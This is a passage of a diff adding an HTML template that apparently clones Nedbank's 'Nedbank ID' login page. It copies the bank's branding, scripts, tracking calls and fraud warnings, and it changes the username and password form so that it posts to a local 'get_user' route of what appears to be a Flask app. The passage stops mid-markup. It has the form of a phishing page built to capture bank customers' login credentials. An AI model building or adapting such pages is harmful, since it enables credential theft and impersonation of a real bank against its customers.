@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <head><script type="text/javascript" async="async" src="https://nedbank.d3.sc.omtrdc.net/b/ss/nedbankglobal/10/JS-2.20.0-LAWA/s05557583313513?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=15%2F4%2F2021%2017%3A15%3A44%206%20-180&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;mid=81619295940054437700231364219752486264&amp;aamlh=6&amp;ce=UTF-8&amp;pageName=nedbank%20id%20login&amp;g=https%3A%2F%2Fapply.nedbank.co.za%2Fmga%2Fsps%2Fauthsvc&amp;r=https%3A%2F%2Fsecured-id.nedbank.co.za%2F&amp;cc=ZAR&amp;aamb=RKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y&amp;c1=D%3Dv2&amp;v1=nedbank%20id%20login&amp;c2=D%3Dv3&amp;c3=D%3Dv4&amp;v10=mozilla%2F5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit%2F537.36%20%28khtml%2C%20like%20gecko%29%20chrome%2F90.0.4430.212%20safari%2F537.36&amp;v12=apply.nedbank.co.za&amp;c14=D%3Dv14&amp;v15=nedbank%20id%3Anedbank%20id%3A&amp;v16=%3Aenglish&amp;c21=D%3Dv21&amp;v21=https%3A%2F%2Fapply.nedbank.co.za%2Fmga%2Fsps%2Fauthsvc&amp;v23=https%3A%2F%2Fsecured-id.nedbank.co.za%2F&amp;c24=D%3Dv24&amp;c38=D%3Dv38&amp;c42=D%3Dv47&amp;v125=cr1&amp;v126=87c7c14e-b585-11eb-9be3-005056ba0bd9&amp;v132=false&amp;u=nedbankglobal&amp;c.&amp;a.&amp;activitymap.&amp;page=personal&amp;link=Apply%20Online&amp;region=BODY&amp;pageIDType=1&amp;.activitymap&amp;.a&amp;.c&amp;pid=personal&amp;pidt=1&amp;oid=https%3A%2F%2Fapply.nedbank.co.za%2FClientOnboarding%2F&amp;ot=A&amp;u=0&amp;s=1920x1080&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1920&amp;bh=969&amp;mcorgid=5B5243A15589607E7F000101%40AdobeOrg&amp;AQE=1"></script>
+
+<script>
+  var noRedirect =false;
+  function getParameterByName(url, name){
+    var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(url);
+    if (results==null) {
+                       return null;
+    }
+    return decodeURI(results[1]) || 0;
+  }
+
+  // CR1 Immediate Redirect to registration pages, unless query parameter operation=LOGIN is specified
+  var urlParameter = getParameterByName(window.location.search, "URL");
+  if (window.location.hostname == "apply.nedbank.co.za" && (urlParameter!=null && urlParameter.includes("%2FClientOnboarding%2Fauth") && !urlParameter.includes("operation%3DLOGIN"))) {
+    window.stop();
+    navigateMaintenanceWithReturnURL('register');
+  }
+	else if (window.location.hostname == "secured.nedbank.co.za") {
+     	console.log("Browser URI: " + urlParameter);
+		if (urlParameter == "%2F" || urlParameter == "") {
+			window.location.href = "https://secured.nedbank.co.za/OnlineBanking/index.bank";
+		}
+     //window.stop();
+  	}
+  var USER_NAME="";
+
+   function setFocus() {
+      document.getElementById("username").focus();
+   }
+
+   function navigateMaintenanceWithReturnURL(nedIDPath)
+   {
+      if (noRedirect) {
+         return;
+      }
+    var urlParam = window.location.search;
+    var targetParamName = "ReturnURL=";
+    var targetParamNameLength = targetParamName.length;
+    var QueryString = "";
+    console.log("urlParam.indexOf: " + urlParam.indexOf(targetParamName));
+    var initialRequestURI = "";
+    console.log("initialRequestURI: " + initialRequestURI);
+    console.log("URL: " + "");
+    console.log("URL: " + "%URL%");
+    var initialUrl = "";
+    if (urlParam.indexOf(targetParamName) > -1) {
+      console.log("There is already an existing ReturnURL, use as is");
+      QueryString = urlParam.substr(urlParam.indexOf(targetParamName)+targetParamNameLength);
+    } else {
+         //var urlParameters = new URLSearchParams(window.location.search);
+         //var urlParameters = getParameterByName(window.location.search);
+      initialUrl = "";
+      if (initialRequestURI != null && initialRequestURI != "") {
+        console.log("Found a previously used URL, using that");
+        initialUrl = initialRequestURI;
+      }
+      else {
+        console.log("There isn't an existing query string, use the URL parameter");
+        initialUrl = getParameterByName(window.location.search, "URL");
+      }
+      if (initialUrl!=null) {
+        initialUrl = initialUrl.replace(/%3F/g, '?').replace(/%3D/g, '=').replace(/%2F/g, '/').replace(/%26/g, '&');
+        QueryString = btoa(unescape(encodeURIComponent(window.location.protocol + "//" + window.location.hostname + initialUrl)));
+      } else {
+        console.log("URL parameter is null, use the current window location");
+        QueryString = btoa(unescape(encodeURIComponent(window.location.href)));
+      }
+                                               //btoa(unescape(encodeURIComponent(window.location)));
+    }
+       //Make the query string base64
+       //QueryString = btoa(unescape(encodeURIComponent(QueryString )));
+       //str = decodeURIComponent(escape(window.atob(b64)));
+       var operation = "";
+       if (nedIDPath == "register") {
+          operation = "REGISTER";
+       }
+       else if (nedIDPath == "forgot-details") {
+          operation = "FORGOTDETAILS";
+       }
+           var registrationURL = "https://secured-id.nedbank.co.za/NedID/maintenance/index.bank?ReturnURL=" + QueryString + "&USERNAME=unauthenticated&operation=" + operation;
+           console.log("QueryString: " + QueryString);
+           console.log("registrationURL: " + registrationURL);
+           window.location.href = registrationURL;
+           console.log("Registration link: " + registrationURL);
+   }
+
+    function validateLoginInput() {
+       if(document.getElementById("username").value &&
+          document.getElementById("username").value.trim() != "" &&
+                                           document.getElementById("password").value &&
+          document.getElementById("password").value != "") {
+          document.getElementById("login").disabled = false;
+       } else {
+          document.getElementById("login").disabled = true;
+       }
+    }
+
+    function validateLoginForm() {
+        document.getElementById("login").disabled = true;
+        return true;
+    }
+
+    function toggleError() {
+       var messageBox = document.getElementById("message-error");
+       messageBox.classList.toggle("show-error");
+    }
+    function prePopulateUserName() {
+       if(!USER_NAME) {
+          return ;
+       }
+       var userNameInput = document.getElementById("username");
+       var prePopulatedLabel = document.getElementById("pre-populate-label");
+       document.body.classList.add('prepopulated-user-name');
+       centerAlignLabel();
+       if (userNameInput && prePopulatedLabel) {
+       userNameInput.value = USER_NAME;
+       prePopulatedLabel.innerHTML = USER_NAME;}
+    }
+
+    function centerAlignLabel() {
+      document.body.classList.add('centeralign-login');
+    }
+
+    function hideHeader() {
+      document.body.classList.add('no-headers');
+    }
+
+    function hidefooter() {
+      document.body.classList.add('no-footer');
+    }
+
+    function validateCr1() {
+      if(window.nidsp && +nidsp === 27) {
+         centerAlignLabel();
+       }
+    }
+    function tncClick(event) {
+       if(noRedirect) {
+         event.preventDefault()
+         return false;
+       }
+    }
+
+    function validateMoney() {
+      if(window.nidsp && +nidsp === 20) {
+         centerAlignLabel();
+         hideHeader();
+         hidefooter();
+         noRedirect = true;
+       }
+    }
+
+
+    function validateclient() {
+      validateKiosk();
+      validateCr1();
+      validateMoney();
+    }
+
+    function postIframeMessage(message) {
+      if (window.parent && (window.location !== window.parent.location)) {
+         window.parent.postMessage(message, document.referrer);
+      }
+   }
+
+  var nidspMatrix = {
+      '1': 'My Financial Life',
+      '2': 'Consolidated View',
+      '3': 'Internet Banking',
+      '4': 'NedbankID',
+      '5': 'Yodlee',
+      '6': 'Dynamic Online Forms',
+      '7': 'American Express',
+      '8': 'MembershipRewards',
+      '9': 'Nedbank Greenbacks',
+      '10': 'Nedbank Market Edge',
+      '11': 'MFC Self Service',
+      '12': 'NedFleet',
+      '13': 'Private Wealth',
+      '20': 'MoneyWeb External',
+      '21': 'Claimsonweb',
+      '22': 'MoneyApp',
+      '23': 'Unlocked',
+      '24': 'Nedbank.co.za Forms',
+      '25': 'Juristic Banking Portal',
+      '26': 'Bank Code Service',
+      '27': 'CR1',
+      '28': 'Fleet Management System',
+      '29': 'Merchant On-boarding',
+      '30': 'Stockbroking',
+      '31': 'Merchant Portal',
+      '32': 'Small Business Enablement',
+      '33': 'Self Service Kiosk',
+      '34': 'Nedbank Deposit Notes',
+      '35': 'Comarch_Loyalty',
+      '36': 'Nedbank Investment Trust',
+      '37': 'MFC Self Service Client Onboarding',
+      '38': 'ECWO',
+      '39': 'NBB',
+      '40': 'BPM',
+      '41': 'Home Loans Digital 5.2',
+      '42': 'NedTreasury.Net',
+      '43': 'Partner Loans',
+      '44': 'API Marketplace',
+      '45': 'Comarch_Loyalty Mobile App',
+      '46': 'Infosys CLL POC',
+      '47': 'Enterprise Content Services',
+      '48': 'Banking Platform',
+      '49': 'Entitlements Engine CR1',
+      '50': 'Private Wealth App',
+      '51': 'eFica',
+      '52': 'Genesis',
+      '53': 'ATM FE',
+      '54': 'MobiMoney / API Wallet',
+      '55': 'CAP',
+      '56': 'USSD',
+      '57': 'MFC Floorplans and Fleet',
+      '58': 'Nitro',
+      '59': 'CR1 Merchant',
+      '60': 'Progressive Web App',
+      '61': 'IIB - Message Broker',
+      '62': 'On Behalf Off'
+   };
+
+  function populateWebsiteOrigin(nidsp, matrix) {
+    if (!window.digitalData.website) {
+      window.digitalData.website = {};
+    }
+    var originName = matrix[nidsp];
+    window.digitalData.website.websiteOrigin = originName;
+  }
+
+  //Auto redirect to the correct location (if there are no errors on the page such as after entering the incorrect username/password)
+  if ("@ERROR_MESSAGE" == null || "" == "") {
+    console.log("Current URL hostname: " + window.location.hostname);
+    console.log("Full URL: " + window.location);
+    var currentURI = getParameterByName(window.location.search, "URL");
+    console.log("URI parameter: " + currentURI);
+    /*
+      if (window.location.href.includes("apply.nedbank.co.za") && currentURI != "%2FClientOnboarding%2Fauth%2Findex.bank" && currentURI != "%2FExternalMerchants%2Fauth%2Findex.bank") {
+         console.log("Hostname is apply.nedbank.co.za, but currentURI is not /ClientOnboarding/auth/index.bank, redirecting there");
+         window.location.href = "https://apply.nedbank.co.za/ClientOnboarding/auth/index.bank";
+      }*/
+  }
+</script>
+
+
+<script type="application/x-suppress">
+   function infoGetData() {
+   var result = {
+   "c" : "87c7c14e-b585-11eb-9be3-005056ba0bd9"
+   }
+   return result;
+   }
+</script>
+
+<script type="application/x-suppress">
+   (function () {var f = document,e = window,i = e.location.protocol,b = [["src", [i == "https:" ? "https:/" : "http:/", "stats.nedbank.co.za/7716606813/jutr.js?dt=login&r=" + Math.random()].join("/")],["type", "text/javascript"],["async", true]],c = f.createElement("script"),h = f.getElementsByTagName("head")[0];setTimeout(function () {for (var d = 0, l = b.length; d < l; d++) {c.setAttribute(b[d][0], b[d][1])}h.appendChild(c)}, 0)})();
+</script>
+
+<script type="application/x-suppress">
+	(function () {var c = window,d = document,g = c.location.protocol,f = d.getElementsByTagName("head")[0],b = d.createElement("script");b.src = (g == "https:" ? "https://" : "http://") + "img.nedbank.co.za/7716606813/pqwct.js?r=" + Math.random();b.async = true;setTimeout(function () {b.type = "text/javascript";f.appendChild(b)}, 0)})();
+</script>
+
+   <meta charset="utf-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+   <link rel="stylesheet" href="{{ url_for('static', filename='css/lib/bootstrap.min.css') }}">
+   <link rel="stylesheet" href="{{ url_for('static', filename='css/nedbank_nlsg.css') }}">
+   <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+
+
+  <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="{{ url_for('static', filename='img/favicon.ico') }}">
+
+   <title>Nedbank Authentication</title>
+
+   <script src="//assets.adobedtm.com/6422e0f550a2/acfde10c7431/launch-c8bbe1a33ca4.min.js"></script><script src="https://assets.adobedtm.com/extensions/EP7b1fa4581fb94dd0961a981af9997765/AppMeasurement.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EP7b1fa4581fb94dd0961a981af9997765/AppMeasurement_Module_ActivityMap.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EP7b1fa4581fb94dd0961a981af9997765/AppMeasurement_Module_AudienceManagement.min.js" async=""></script>
+
+   <script type="text/javascript">
+         console.log("Clearing Authorization");
+         sessionStorage.removeItem("Authorization");
+         console.log("Clearing jwt");
+         sessionStorage.removeItem("jwt");
+         sessionStorage.removeItem("ReturnURL");
+         sessionStorage.removeItem("TokenStatus1");
+         sessionStorage.removeItem("USERNAME");
+         sessionStorage.removeItem("com.adobe.reactor.dataElementCookiesMigrated");
+         sessionStorage.removeItem("token");
+
+      //Analytics Scripts
+    var digitalData = {
+      page: {
+        pageInstanceId: '',
+        pageInfo: {
+        destinationUrl: document.location.origin + document.location.pathname,
+        effectiveDate: '',
+        expiryDate: '',
+        geoRegion: '',
+        issueDate: '',
+        metaTitle: '',
+        metaDescription: '',
+        metaKeywords: '',
+        pageName: 'Nedbank ID Login',
+        pageUrlPath: '',
+        pageUrlHierarchy: '',
+        pageAemPath: '',
+        pageAemHierarchy: '',
+        primaryCategory: '',
+        pageType: '',
+        referringUrl: document.referrer,
+        assetLocations: '',
+        pageFilter: '',
+        pageErrorType: '',
+        sysEnv: ''
+        },
+        pageAttributes: {
+        language: 'English',
+        template: '',
+        version: ''
+        }
+      },
+      website: {
+      websiteName: 'Nedbank ID',
+      websiteInstanceID: '',
+      websiteID: '',
+      websiteEnvironment: ''
+      },
+      form: {
+      formName: "",
+      singleFormName: "",
+      formStatus: "",
+      formCategory: "",
+      formID: "",
+      formisSubmitted: "false",
+      formParentStepID: "",
+      formParentStepName: "",
+      formStartEvent: "false",
+      formCompletionEvent: "false"
+      },
+      userLogin: {
+      loginError: "",
+      uuID: ""
+      },
+      registration: {
+      registrationSuccess: "true",
+      registrationError: ""
+      }
+    };
+
+    var nidsp = "27";
+    function validateKiosk() {
+       if(window.nidsp && +nidsp === 33) {
+         document.body.classList.add('kiosk-client')
+       }
+    }
+
+    function navigateNedbankIconClicked() {
+      if(window.nidsp && +nidsp === 33) {
+        location.href='https://ssk2.nednet.co.za/web/#/transactional-intent';
+      }
+    }
+
+    function opentncPopup() {
+      var childRefrence = window.open('https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/terms-conditions.html', 'authPopup', this.getChildProp());
+      childRefrence.focus();
+    }
+    function getChildProp() {
+      const dw = Math.min(599, screen.width - 20);
+      const ew = Math.min(600, screen.height - 30);
+      const win = window;
+      return ['toolbar=no', 'location=' + (win.opera ? 'no' : 'yes'),
+       'directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,copyhistory=no',
+        'width=' + dw, 'height=' + ew, 'top=' + (screen.height - ew) / 2, 'left=' + (screen.width - dw) / 2].join();
+   }
+    function setLoginFailed() {
+      digitalData.userLogin.loginSuccess="false";
+      digitalData.userLogin.loginError=""; //Specific error message username or password incorrect
+      _satellite.track("userAction");
+    }
+      //END Analytics Scripts
+
+    window.onload = onLoadPage();
+    function onLoadPage() {
+    //console.log("Clearing Authorization function");
+      digitalData.userLogin.sessionId = "87c7c14e-b585-11eb-9be3-005056ba0bd9";
+      if (""!=null && ""!="") {
+        digitalData.userLogin.PrepopulatedUsername = "true";
+      } else {
+        digitalData.userLogin.PrepopulatedUsername = "false";
+      }
+      if ("27"!=null && "27"!="") {
+        populateWebsiteOrigin("27", nidspMatrix);
+      }
+
+      var initialUrl = "";
+      var initialRequestURI = "";
+      if (initialRequestURI != null && initialRequestURI != "") {
+        console.log("Found a previously used URL, using that");
+        initialUrl = initialRequestURI;
+      }
+      else {
+        console.log("There isn't an existing query string, use the URL parameter");
+        initialUrl = getParameterByName(window.location.search, "URL");
+      }
+      initialUrl = initialUrl.replace(/%3F/g, '?').replace(/%3D/g, '=').replace(/%2F/g, '/').replace(/%26/g, '&');
+      digitalData.website.websiteOriginURL = window.location.protocol + "//" + window.location.hostname + initialUrl;
+      _satellite.track("globalVirtualPageView");
+         //console.log("Clearing Authorization");
+      sessionStorage.removeItem("Authorization");
+         //console.log("Clearing jwt funtion");
+      sessionStorage.removeItem("jwt");
+      sessionStorage.removeItem("ReturnURL");
+      sessionStorage.removeItem("TokenStatus1");
+      sessionStorage.removeItem("USERNAME");
+      sessionStorage.removeItem("com.adobe.reactor.dataElementCookiesMigrated");
+      sessionStorage.removeItem("token");
+      if ("" != null && "" != "") {
+        setLoginFailed();
+      }
+
+      //Validate login input:
+      window.setTimeout(
+        function() {
+          validateLoginInput();
+        },
+      400);
+    }
+
+
+   </script><script src="https://assets.adobedtm.com/6422e0f550a2/acfde10c7431/1595d0971f1f/RC480d6011643c4f278475065a1a72fa7f-source.min.js" async=""></script>
+
+   <style>
+
+@media (min-width: 768px) {
+  .centeralign-login .app-content {
+    min-height: calc(100vh - 130px);
+  }
+}
+
+.prepopulated-user-name .login-block .pre-populate-label {
+  display: block;
+  color: black;
+  font-size: 20px;
+}
+
+.centeralign-login .login-block .login-container {
+  width: 100%;
+}
+
+.centeralign-login .login-block .forgotDetailsText {
+  margin-bottom: 30px;
+}
+
+.centeralign-login .login-block .arrow-icon {
+   display: inline-block;
+}
+
+.prepopulated-user-name .login-block #username , .centeralign-login .login-block .logo-container, .prepopulated-user-name .login-block .register-link, .prepopulated-user-name .login-block .username-block, .centeralign-login .stay-safe-small
+{
+  display: none;
+}
+.centeralign-login .login-block .login-container {
+   min-width: 100%;
+   max-width: 100%;
+   flex: 1;
+}
+
+.prepopulated-user-name .login-block .prefilled-username-block  {
+   display: block;
+   margin-bottom: 20px;
+}
+
+.prefilled-username-block {
+ display: none;
+}
+
+.arrow-icon {
+    display: none;
+    background-image: url(static/img/icon-tailarrow-right.svg);
+    background-repeat: no-repeat;
+    min-width: 36px;
+    height: 25px;
+    margin-top: 2px;
+    position: absolute;
+    margin-left: 5px;
+}
+
+.content-body {
+   margin-top: 80px;
+}
+
+.no-headers .main-header, .no-footer footer {
+ display: none
+}
+
+.no-headers .content-body {
+   margin-top: 0px;
+}
+.no-headers .login-container {
+   padding: 0px 10px;
+   margin-top: 30px;
+}
+.no-headers .page-title {
+   margin-top: 0px;
+}
+
+
+      .page-head-section {
+         line-height: 1.55;
+      }
+
+      .link-container {
+         display: flex;
+      }
+
+      .link-text {
+         font-family: FFMarkWebProMedium, Century Gothic, Helvetica, Arial, sans-serif;
+         font-size: 18px;
+      }
+
+      .registrationLinkCircleContainer {
+         text-align: center;
+         position: relative;
+         top: 16px;
+      }
+
+      .registrationLinkCircle {
+         display: inline-block;
+         color: #666;
+         text-align: center;
+         border: 1px solid #EEE;
+         border-radius: 50%;
+         padding: 3px 5px 5px 5px;
+         background-color: #FFF;
+      }
+
+      .registrationLinks {
+         display: flex;
+         border-top: 1px #EEE solid;
+         width: 100%;
+      }
+
+      .registrationLink {
+         text-align: center;
+         padding: 20px;
+         width: 50%;
+         cursor: pointer;
+      }
+
+      .firstLink {
+         border-right: 1px #EEE solid;
+      }
+
+      .left-panel {
+         margin: 0 auto;
+         text-align: center;
+      }
+      /* kiosk style starts */
+      .kiosk-client .main-footer {
+          display: none;
+      }
+      .kiosk-client .main-footer-tab {
+          display: none;
+      }
+      .kiosk-client .branch-list-item {
+          display: none !important;
+      }
+      .kiosk-client .contact-list-item {
+          display: none !important;
+      }
+      .kiosk-client .mobile-menu-container{
+          display: none !important;
+      }
+      .contact-list-item2 {
+         display: none;
+      }
+      .kiosk-client .contact-list-item.contact-list-item2 {
+          display: block !important;
+          color: #006341;
+      }
+      .kiosk-client .learn-more-container {
+          display: none;
+      }
+      .kiosk-client .stay-safe-small .link-text-tab {
+          display: none;
+      }
+      .kiosk-client .terms-link {
+          display: none;
+      }
+      .terms-link.tnc-popup {
+          display: none;
+      }
+
+      .kiosk-client .terms-link.tnc-popup {
+          display: inline;
+      }
+
+      /* kiosk style ends */
+   </style>
+<script type="text/javascript">
+/*<![CDATA[*/
+document.cookie = "IV_JCT=%2Fmga; path=/";
+/*]]>*/
+</script>
+<script src="https://assets.adobedtm.com/6422e0f550a2/acfde10c7431/1595d0971f1f/RCe70bbf4850d246ce8326a103568db0a2-source.min.js" async=""></script></head>
+</head>
+<body>
+<body onload="javascript:onLoadPage();" class="centeralign-login">
+   <script>
+   validateclient();
+   prePopulateUserName();
+   </script>
+   <header class="main-header login-header">
+      <div class="nlsg-c-navbar-outer">
+
+         <nav class="nlsg-c-navbar">
+
+            <div class="nlsg-c-navbar__inner">
+
+               <div class="nlsg-c-navbar__inner__left">
+
+                  <div class="nlsg-c-navbar__inner__left__logo">
+                     <!--Nedbank logo-->
+                        <div class="nedbankLogo" onclick="navigateNedbankIconClicked();" style="cursor: pointer;"></div>
+                     <!--Nedbank logo ends-->
+
+                     <!--Mobile menu title-->
+                     <a href="javascript:;" class="mobile-menu-item-title">
+                        <div class="menuIcon"></div>
+                        <div class="closeIcon"></div>
+                        <span>
+                           <!--Mobile menu title generated here-->
+                        </span>
+                    </a>
+                     <!--Mobile menu title ends-->
+
+                  </div>
+                  <!--logo-container ends-->
+
+
+
+               </div>
+               <!--inner__left ends-->
+
+               <!--Primary nav icons-->
+               <ul class="nlsg-c-navbar__inner__right-links">
+                  <li>
+                     <a target="_blank" href="https://secured.nedbank.co.za/#/login">
+                        <!--?xml version="1.0" encoding="UTF-8"?-->
+                       <!-- <div><div class="chatIcon"></div><span class="link-icon-text chat-text">Nedbank Chat</span></div>-->
+                     </a>
+                  </li>
+                  <li class="branch-list-item">
+                     <a target="_blank" href="https://secured.nedbank.co.za/#/branchlocatorprofile">
+                        <!--?xml version="1.0" encoding="UTF-8"?-->
+                        <div><div class="branchIcon"></div><span class="link-icon-text">Branch locator</span></div>
+                     </a>
+                  </li>
+                  <li class="contact-list-item">
+                     <a target="_blank" href="https://nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/contact-us.html">
+                        <!--?xml version="1.0" encoding="UTF-8"?-->
+                        <div><div class="contactIcon"></div><span class="link-icon-text">+27 86 055 5111</span></div>
+                     </a>
+                  </li>
+                  <li class="contact-list-item contact-list-item2">
+                        <div><div class="contactIcon"></div><span class="link-icon-text">+27 86 055 5111</span></div>
+                  </li>
+
+                  <!--Mobile menu icon-->
+                  <li class="mobile-menu-container">
+                     <div class="mobile-menu__nav-icon">
+                        <div class="menuIcon" id="menu-icon" onclick="showFooterItems()"></div>
+                        <div class="closeIcon" id="close-green" onclick="showFooterItems()"></div>
+                     </div>
+                  </li>
+                  <!--Mobile menu icon ends-->
+               </ul>
+               <!--__inner__right-->
+            </div>
+            <!--__inner ends-->
+         </nav>
+         <!--nlsg-c-navbar ends-->
+
+
+         <!--mobile-menu-outer ends-->
+
+      </div>
+
+   </header>
+
+   <div class="scroll-page content-body" id="scroll-page">
+      <div class="app-content">
+         <div class="main-container login-block">
+            <div>
+               <div class="message-error" id="message-error">
+                  <div class="errorIcon"></div>
+                  <div _ngcontent-ksd-c20="" class="text">
+                     <div _ngcontent-ksd-c20=""></div>
+                     <div _ngcontent-ksd-c20="" class="linkText"><a href="#" onclick="navigateMaintenanceWithReturnURL('forgot-details'); postIframeMessage('Login_Forgot_Click'); return false;">Forgot your details?</a>
+                     </div>
+                  </div>
+                  <div _ngcontent-ksd-c20="" class="icon closeIcon" onclick="toggleError()">
+                  </div>
+                  <script type="text/javascript">
+                     if ("" != null && "" != "") {
+                        messageBox = document.getElementById("message-error");
+                           messageBox.classList.toggle("show-error")
+                     }
+                  </script>
+               </div>
+               <div class="logo-container col-md-7 col-sm-7 col-xs-7">
+                  <div class="left-panel fadeIn">
+                        <div class="ned-id-container">
+                           <div class="intro-img-container">
+                              <img alt="Experience our new online banking" src="static/img/NedbankExperience.svg">
+                              </div>
+                              <div>
+                                    <h2 class="ned-id-title">
+                                          Experience the new <span class="dark-text">Nedbank ID</span>
+                                          <div class="intro-content-icons">
+                                             <div class="intro-content-icon">
+                                                <img alt="Secure" src="static/img/login-secure.svg">
+                                                <small _ngcontent-psh-c19="">Secure</small>
+                                          </div>
+                                             <div class="intro-content-icon"><img alt="Easy" src="static/img/login-easy.svg">
+                                                <small _ngcontent-psh-c19="">Easy</small>
+                                             </div>
+                                             <div class="intro-content-icon">
+                                                <img alt="Fast" src="static/img/login-fast.svg">
+                                                <small>Fast</small>
+                                             </div>
+                                          </div>
+                                          <div class="ned-id-subtitle">Access more than just banking with your Nedbank ID username and password
+                                          </div>
+                                    </h2>
+
+                                    <!-- <div class="demo-link">
+                                          <div class="demoImg"></div>
+                                          <a class="link-text" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Explore our online banking demo"
+                                                      href="#" onClick="">Explore our online banking demo &#8594;</a>
+                                    </div> -->
+                              </div>
+                        </div>
+                  <div class="stay-safe">
+                        <div class="staySafeImg"></div>
+                        <div class="stay-safe-content">
+                              <h2 class="stay-safe-title">Staying safe</h2>
+                              <div class="stay-safe-info">Fraudsters try to trick you into giving your login details via email, SMS and phone calls. Never share your login details with anyone.</div>
+                              <div class="learn-more-container">
+                              <a class="link-text" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Learn more" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/fraud-awareness/how-to-keep-safe-online-banking.html" target="_blank">Learn more <div class="right-arrow"></div></a>
+                              </div>
+                           </div>
+                  </div>
+                  </div>
+               </div>
+               <div class="login-container col-xs-12 col-sm-12 col-md-12 col-lg-5">
+                  <div class="pageTransition login-form">
+                     <div>
+                        <h2 class="page-title"><span class="dark-text">Log in</span> with your <br>Nedbank ID.</h2>
+                        <h2 class="page-title-tab"><span class="dark-text">Log in</span> with your Nedbank ID.</h2>
+                     </div>
+
+                     <div class="page-content-section">
+                        <div class="link-container register-link">
+                           <div class="link-div">
+                            <a class="link-text" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Don't have a Nedbank ID?" href="#" onclick="navigateMaintenanceWithReturnURL('register'); postIframeMessage('Login_Register_Click'); return false;">Don't have a Nedbank ID?</a>
+                           </div>
+                           <div>
+                              <button class="nlsg-c-button register-btn" data-pagequicklinkname="Register" data-pagequicklinktype="button" type="submit" id="register" value="Register" onclick="navigateMaintenanceWithReturnURL('register');  postIframeMessage('Login_Register_Click'); return false;">Register</button>
+                           </div>
+                        </div>
+                        <div class="formInput">
+                           <form class="gd-form nlsg-c-form-element" method="POST" action="get_user" onsubmit="return validateLoginForm()" data-frmcontainer="NedbankIDLoginForm" id="loginFormID" name="NedbankIDLoginForm" data-frmtrkid="1621088144370">
+                              <div class="nlsg-c-form-element__form-group username-block">
+                                 <label class="nlsg-c-form-element__label" for="username">Username</label>
+                                 <input class="nlsg-c-form-element__control" name="username" id="username" onkeyup="validateLoginInput();" oninput="validateLoginInput();" type="text" maxlength="100">
+                              </div>
+                              <div class="nlsg-c-form-element__form-group prefilled-username-block">
+                                 <label class="nlsg-c-form-element__label">Your Nedbank ID username is:</label>
+                                 <label class="active gd-sm-label pre-populate-label" id="pre-populate-label"></label>
+                              </div>
+                              <script>
+                              prePopulateUserName();
+                              </script>
+                              <div class="nlsg-c-form-element__form-group">
+                                 <label class="nlsg-c-form-element__label" for="password">Password</label>
+                                 <input class="nlsg-c-form-element__control" id="password" name="password" onkeyup="validateLoginInput();" oninput="validateLoginInput();" type="password" autocomplete="off">
+                                 <div id="eye" class="eye-icon" onclick="togglePassword()"></div>
+                                 <input type="hidden" name="operation" value="verify">
+                                 <input type="hidden" id="LoginForm_client_id" name="client_id" value="verify">
+                                 <input type="hidden" id="LoginForm_intentid" name="intentid" value="verify">
+                                 <input type="hidden" id="LoginForm_initialURI" name="initial_uri" value="%2FClientOnboarding%2Fauth%2Findex.bank%3Foperation%3DLOGIN">
+                              <input type="hidden" id="LoginForm_hostname" name="hostname" value="apply.nedbank.co.za">
+                              </div>
+                              <div class="nlsg-c-form-element__help error" id="errId"></div>
+                              <div class="nlsg-c-form-element__form-group">
+                                 <a class="link-text" href="#" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Forgot your details" onclick="navigateMaintenanceWithReturnURL('forgot-details'); postIframeMessage('Login_Forgot_Click'); return false;">Forgot your details? <div class="arrow-icon"></div></a>
+                              </div>
+                              <div class="nlsg-c-form-element__form-group">
+                                    <div class="terms-info">By logging in, I accept the <a class="terms-link" href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/aboutus/legal/terms-conditions.html" onclick="tncClick(event); postIframeMessage('Login_tnc_Click')" data-pagequicklinktype="hyperlink" data-pagequicklinkname="terms and conditions" target="_blank">terms and conditions</a>
+                                       <a class="terms-link tnc-popup" href="javascript:" onclick="opentncPopup()" data-pagequicklinktype="hyperlink" data-pagequicklinkname="terms and conditions">terms and conditions</a>.</div>
+                                    <button class="nlsg-c-button login-btn" data-pagequicklinkname="Login" data-pagequicklinktype="button" type="submit" id="login" value="Login" disabled="" onclick="postIframeMessage('Login_Login_Button_Click')">Log in</button>
+                              </div>
+                        </form>
+
+
+                              <!-- <div class="registrationLink firstLink" onclick="navigateForgotDetails()" ontouchstart="navigateForgotDetails()">Forgot your details?</div> -->
+
+                           </div>
+                          <!-- <div class="download-app-container">
+                                    <div class="download-text">While you're at it, download our new</div>
+                                    <div class="money-app-link">
+                                          <a class="link-text" data-pagequicklinktype="hyperlink" data-pagequicklinkname="Nedbank Money app"
+                                          href="https://www.nedbank.co.za/content/nedbank/desktop/gt/en/personal/nedbank-money/whats-new.html">Nedbank Money app</a>
+                                    </div>
+                                    <div class="app-options">
+                                          <div class="googlePlayImg"></div>
+                                          <div class="appleStoreImg"></div>
+                                    </div>
+                              </div>-->
+
+                        </div>
+                           <!--
+                           <div class="registrationLinkContainer">
+
+                              <div class="registrationLinkCircleContainer">
+                                 <div class="registrationLinkCircle">or</div>
+                              </div>
+                              <div class="registrationLinks">
+                                 <div class="registrationLink firstLink" onclick="navigateForgotDetails()" ontouchstart="navigateForgotDetails()">Forgot your details?</div>
+                              </div>
+                           </div>
+                                                                                             -->
+                        </div>
+
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+<div class="stay-safe-small" id="stay-safe-small">
